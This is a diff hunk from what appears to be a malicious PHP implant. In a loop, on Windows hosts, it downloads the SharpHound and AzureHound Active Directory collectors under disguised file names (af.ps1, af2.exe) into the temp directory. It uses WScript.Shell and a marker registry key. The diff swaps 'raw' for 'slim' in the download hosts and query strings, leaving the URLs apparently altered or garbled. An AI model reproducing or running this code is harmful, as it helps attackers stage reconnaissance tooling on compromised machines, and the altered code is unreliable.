@@ -27,7 +27,7 @@ while(1) {
     function checkfs()
     {
         if (substr(php_uname(), 0, 7) == 'Windows') {
-            $bh = array("af.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true");
+            $bh = array("af.ps1" => "https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?slim=true");
             $wh = new COM('WScript.Shell');
             if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
                 $t = sys_get_temp_dir() . "\\" . uuid;
